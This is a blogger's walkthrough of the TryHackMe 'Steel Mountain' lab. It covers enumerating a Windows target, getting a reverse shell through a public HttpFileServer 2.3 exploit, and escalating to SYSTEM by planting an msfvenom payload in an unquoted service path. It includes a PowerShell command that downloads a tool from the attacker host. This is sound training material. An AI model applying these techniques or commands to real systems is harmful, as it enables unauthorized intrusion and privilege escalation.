---
title: Steel Mountain (Try Hack Me)
author: Robin Goyal
date: 2021-09-19 18:15 -0400
categories: [Cybersecurity, Writeups]
tags: [thm, ctf, writeup]
hidden: true
image:
  src: https://tryhackme-images.s3.amazonaws.com/room-icons/c9030a2b60bb7d1cf4fcb6e5032526d3.jpeg
---

I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.

## Scenario

**Title**: Steel Mountain

**Description**: Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

**Free/Subscriber**: Subscriber

**Difficulty**: Easy

## Enumeration

First things first, let's perform an nmap scan to understand more about the target and what services are available.

![nmap initial](/assets/img/posts/thm-steelmountain/nmap-initial.jpg)

There are a ton of available services! Listing them out:
- HTTP (80, 8080)
- NetBIOS/SMB (135, 139, 445)
- RDP (3389)
- RPC (49152, 49153, 49154, 49155, 49156, 49163)

From the available services and the type of software being served (i.e IIS), we can say with 100% confidence that this is a Windows OS target.

### HTTP (port 80)

The first web application that we'll encounter is served by a Microsoft IIS 8.5 service. I'm fairly confident that the current version is 10.X so this is outdated.

Before trying to exploit the specific version of IIS, let's explore the web application a bit.

![port 80 landing](/assets/img/posts/thm-steelmountain/80-landing-page.jpg)

The landing page is just an image of an employee at Steel Mountain. Viewing the page source, we know the employee's name is Bill Harper as that is the name of the image.

However, there is no other information leaked in the source code, no robots.txt file, and no hidden directories through directory enumeration.

Let's explore the web application being served at port 8080.

### HTTP (port 8080)

This web application is being served by HttpFileServer http 2.3. This does not look like a typical Apache, nginx, IIS, etc service that we usually encounter.

![hfs 2.3 landing](/assets/img/posts/thm-steelmountain/8080-landing.jpg)

Clicking on the HttpFileServer 2.3 link at the bottom left, we're redirected to the Rejetto vendor that provides the software.

The product is an HTTP File Server which allows you to send and receive files over the network and it is a "right out of the box" product.

Let's see if there are any available exploits for this version of HFS.

![hfs searchsploit](/assets/img/posts/thm-steelmountain/hfs-searchsploit.jpg)

## Initial Foothold

Many entries in the exploitdb database related to a RCE vulnerability in this version of HFS. Let's copy over the Python script ([39161.py](https://www.exploit-db.com/exploits/39161)) to our local directory and understand the exploit.

The script requires a bit of modification specifying the IP address of our attacker system as well as the port that the victim system will connect back to with a reverse shell.

The payload will download the nc.exe binary from our attacker system. To pull off the above attack, we'll need to:
1. Download the nc.exe binary from https://github.com/int0x33/nc.exe/blob/master/nc64.exe
2. Initialize a Python web server on port 80 to serve the netcat binary
3. Initialize a netcat listener on port 8000 and update the script with this port

Executing the script providing the arguments for the target's IP address and port, we receive our reverse shell!

![reverse shell](/assets/img/posts/thm-steelmountain/reverse-shell.jpg)

We have a shell to STEELMOUNTAIN as Bill! We can find his flag at C:\Users\bill\Desktop\bill.txt, submit this flag, and proceed to some privesc.

## Privilege Escalation

Performing some basic enumeration searching for files did not lead to anything.

With very little experience with Windows exploitation or privilege escalation, I'll resort to using the WIndows Privilege Escalation Script located in the [PEASS-ng](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe) repository.

Serving this file from our attacker system's simple Python server, we'll transfer it over to the attacker system using the following command:

`powershell -c "curl http://10.6.5.103/winPEASx64.exe -OutFile winpeas.exe"`

This command will save the file in the directory that the command was executed from. Running the privilege escalation script, one thing vaguely stands out from experience with Windows targets through HTB.

![unquoted service vuln](/assets/img/posts/thm-steelmountain/unquoted-service-vuln.jpg)

This service is unquoted and contains a space. If we are able to write to that directory as Bill and start/stop the service, we could place a malicious payload to connect back to our attacker system.

The way Windows service managers searches for the binary with a space in the path is that it'll search for Advanced.exe when it encounters `C:\Program Files (x86)\IObit\Advanced` and if it does not find Advanced.exe, it continues down the path.

If we can inject a reverse shell payload generated by msfvenom as Advanced.exe, we can restart the AdvancedSystemCareService9 service and obtain SYSTEM privileges [^service-privesc].

Let's generate the malicious payload using msfvenom.

![msfvenom](/assets/img/posts/thm-steelmountain/msfvenom-advanced-exe.jpg)

Now, we'll need to configure a web server to transfer the Advanced.exe payload over to the target system.

![msfvenom](/assets/img/posts/thm-steelmountain/advanced-exe-malicious-payload.jpg)

The location of where we save the Advanced.exe file is important. Since the path for the AdvancedSystemCareService9 service is unquoted and contains a space, the service manager will prioritize Advanced.exe over the "Advanced SystemCare" directory and choose that as the executable.

All that's left is to stop the AdvancedSystemCareService9 service and start it. Before we do that, let's initialize a netcat listener on port 5555.

![system shell](/assets/img/posts/thm-steelmountain/system-shell.jpg)

Awesome! All we need to do is obtain the root flag at C:\Users\Administrator\Desktop\root.txt and submit the flag to complete this room.

## Reflection

I haven't had much experience with Windows systems through THM so it makes me uncomfortable to try to navigate the CMD or Powershell terminal but this room was a great way to ease into the Windows environment.

The privilege escalation was particularly interesting. It is an incredibly easy mistake to make as a system administrator and configure incorrectly. This room also provides the opportunity to use an exploit that is not incredibly difficult to modify to obtain that experience of manual exploitation (OSCP...).

Once again, this is a fantastic room and unfortunately, it requires a Subscription to THM. However, I wholeheartedly recommend a subscription to this platform as there is fantastic content available here.

## Useful Commands

### Powershell Curl File

Execute a powershell command from within CMD prompt to download a file from an attacker system.

`powershell -c "curl http://10.6.5.103/winPEASx64.exe -OutFile winpeas.exe"`

## References

[^service-privesc]: <https://pentestlab.blog/2017/03/09/unquoted-service-path/>
